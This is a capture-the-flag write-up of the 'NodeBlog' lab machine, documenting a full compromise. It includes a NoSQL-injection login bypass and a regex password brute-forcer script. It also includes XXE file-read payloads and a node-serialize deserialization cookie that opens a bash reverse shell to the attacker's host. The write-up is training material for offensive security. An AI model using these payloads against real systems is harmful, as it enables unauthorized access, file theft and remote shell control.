# NodeBlog (Easy - Linux)

## Recon
### Nmap
```console
# nmap -Pn --open -sC -sV -p- 10.10.11.139
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-13 21:00 EST
Nmap scan report for 10.10.11.139
Host is up (0.033s latency).
Not shown: 65524 closed ports, 9 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Initial Access
### NoSQL Injection (Login)
Change the Content-Type to `application/json` since the application is running NodeJS using Express framework and pass the json payload:
```
POST /login HTTP/1.1
Host: 10.10.11.139:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 65
Origin: http://10.10.11.139:5000
Connection: close
Referer: http://10.10.11.139:5000/login
Upgrade-Insecure-Requests: 1

{"user":"admin",
    "password": {
        "$ne":"thisisnotapassword"
    }
}
```
--> This logged us in.

### Bruteforcing Login Password
`login.py`
```python
import requests
import json
import string
import sys

def login(url, endpoint, password, pw):

    payload = '{ "$regex": "%s%s" }' % (password,pw)

    data = {
        "user":"admin",
        "password": json.loads(payload),
    }

    r = requests.post(url + endpoint, json=data)
    #print(r.status_code)

    if "Invalid Password" in r.text:
        return False
    else:
        return True

def brute(url, endpoint):
    password = '^'
    pw = '$'
    stop = False

    while stop == False:
        for i in string.ascii_letters:
            sys.stdout.write(f"\r{password}{i}")
            if login(url, endpoint, password, i):
                password += i
                if login(url, endpoint, password, pw):
                    sys.stdout.write(f"\r[INFO] Password: {password}{pw}\r\n")
                    sys.stdout.flush()
                    stop = True
                    break
                break              

if __name__ == '__main__':
    url = "http://10.10.11.139:5000"
    endpoint = "/login"

    #login(url, endpoint, pw)
    brute(url, endpoint)
```

```console
$ python3 login.py
[INFO] Password: ^IppsecSaysPleaseSubscribe$
```

### XXE (After Login)
Payload #1
```xml
<!--?xml version="1.0" ?--><!DOCTYPE replace [<!ENTITY example "bigb0ss"> ]><post><title>Example Post</title><description>&example;</description><markdown>Example Markdown</markdown></post>
```
--> Response

```html
...snip...
  <div class="form-group">
    <label for="description">Description</label>
    <textarea name="description" id="description" class="form-control">bigb0ss</textarea>
  </div>
...snip...
```

Payload #2
```xml
<!--?xml version="1.0" ?--><!DOCTYPE replace [<!ENTITY example SYSTEM 'file:///etc/passwd'> ]><post><title>Example Post</title><description>&example;</description><markdown>Example Markdown</markdown></post>
```
--> This can read `/etc/passwd`

### XXE --> Node Deserialization RCE
`server.js`
```xml
<!--?xml version="1.0" ?--><!DOCTYPE replace [<!ENTITY example SYSTEM 'file:///opt/blog/server.js'> ]><post><title>Example Post</title><description>&example;</description><markdown>Example Markdown</markdown></post>
```

```js
const express = require('express')
const mongoose = require('mongoose')
const Article = require('./models/article')
const articleRouter = require('./routes/articles')
const loginRouter = require('./routes/login')
const serialize = require('node-serialize')
const methodOverride = require('method-override')
const fileUpload = require('express-fileupload')
const cookieParser = require('cookie-parser');
const crypto = require('crypto')
const cookie_secret = "UHC-SecretCookie"
//var session = require('express-session');
const app = express()

mongoose.connect('mongodb://localhost/blog')

app.set('view engine', 'ejs')
app.use(express.urlencoded({ extended: false }))
app.use(methodOverride('_method'))
app.use(fileUpload())
app.use(express.json());
app.use(cookieParser());
//app.use(session({secret: "UHC-SecretKey-123"}));

function authenticated(c) {
    if (typeof c == 'undefined')
        return false

    c = serialize.unserialize(c)

    if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex')) ){
        return true
    } else {
        return false
    }
}


app.get('/', async (req, res) => {
    const articles = await Article.find().sort({
        createdAt: 'desc'
    })
    res.render('articles/index', { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) })
})

app.use('/articles', articleRouter)
app.use('/login', loginRouter)


app.listen(5000)
```

Payload POC: https://snyk.io/test/npm/node-serialize

```
$ echo -n "bash -i  >& /dev/tcp/10.10.14.2/9001  0>&1" | base64
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi85MDAxICAwPiYx
```

```
auth={"user":"admin","sign":"23e112072945418601deb47d9a6c7de8","bigb0ss":"_$$ND_FUNC$$_function (){require(\"child_process\").exec(\"echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi85MDAxICAwPiYx | base64 -d | bash\", function(error, stdout, stderr) { console.log(stdout) });}()"}
```
You need to URL encode the above payload:

```
GET / HTTP/1.1
Host: 10.10.11.139:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: auth=%7b%22%75%73%65%72%22%3a%22%61%64%6d%69%6e%22%2c%22%73%69%67%6e%22%3a%22%32%33%65%31%31%32%30%37%32%39%34%35%34%31%38%36%30%31%64%65%62%34%37%64%39%61%36%63%37%64%65%38%22%2c%22%62%69%67%62%30%73%73%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%20%28%29%7b%72%65%71%75%69%72%65%28%5c%22%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%5c%22%29%2e%65%78%65%63%28%5c%22%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%67%50%69%59%67%4c%32%52%6c%64%69%39%30%59%33%41%76%4d%54%41%75%4d%54%41%75%4d%54%51%75%4d%69%38%35%4d%44%41%78%49%43%41%77%50%69%59%78%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%5c%22%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%20%7b%20%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%20%7d%29%3b%7d%28%29%22%7d
Upgrade-Insecure-Requests: 1
```

We get a reverse shell:
```
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.139] 53958
bash: cannot set terminal process group (854): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

bash: /home/admin/.bashrc: Permission denied
admin@nodeblog:/opt/blog$ id
id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
```

### user.txt
```
root@nodeblog:~# cat /home/admin/user.txt
34be__REDACTED__4956
```

## Privesc
```
admin@nodeblog:/etc$ sudo -l
[sudo] password for admin: 
Matching Defaults entries for admin on nodeblog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on nodeblog:
    (ALL) ALL
    (ALL : ALL) ALL
admin@nodeblog:/etc$ sudo su -
root@nodeblog:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### root.txt
```
root@nodeblog:~# cat /root/root.txt
a3d1__REDACTED__0957
```
